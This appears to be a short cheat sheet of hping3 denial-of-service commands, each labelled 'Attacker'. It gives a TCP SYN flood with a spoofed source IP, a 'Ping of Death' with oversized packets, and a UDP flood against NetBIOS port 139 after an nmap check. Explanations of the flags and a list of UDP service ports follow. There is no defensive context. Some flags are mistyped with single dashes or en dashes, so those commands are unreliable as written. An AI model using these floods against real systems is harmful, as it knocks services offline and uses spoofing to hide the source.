# 👉 Hping3

**Attacker**

`hping3 -S [Target IP] -a [Spoofable IP] -p 22 -flood`

* \-S: Set the SYN flag
* \-a: Spoof the IP address
* \-p: Specify the destination port
* — flood: Send a huge number of packets

**Attacker (Perform PoD)**

hping3 -d 65538 -S -p 21 –flood \[Target IP]

* \-d: Specify data size
* \-S: Set the SYN flag

**Attacker (Perform UDP application layer flood attack)**

* nmap -p 139 10.10.10.19 (check service)
* hping3 -2 -p 139 –flood \[IP]

Other Hping3 flags

* \--udp -> specifies sending the UDP packets to the target host
* \-2 -> specifies UDP mode
* \--rand-source -> enables random source mode
* \--data -> specifies the data body size
* \-d -> specifies the data size
* \-S -> sets the SYN flag
* \-p -> assigning the port to send the traffic
* \-c -> count of packets sent
* \--flood -> performs TCP flooding (sends a huge # of packets)

**Other UDP-based applications and their ports**

* CharGen UDP Port 19
* SNMPv2 UDP Port 161
* QOTD UDP Port 17
* RPC UDP Port 135
* SSDP UDP Port 1900
* CLDAP UDP Port 389
* TFTP UDP Port 69
* NetBIOS UDP Port 137,138,139
* NTP UDP Port 123
* Quake Network Protocol UDP Port 26000
* VoIP UDP Port 5060





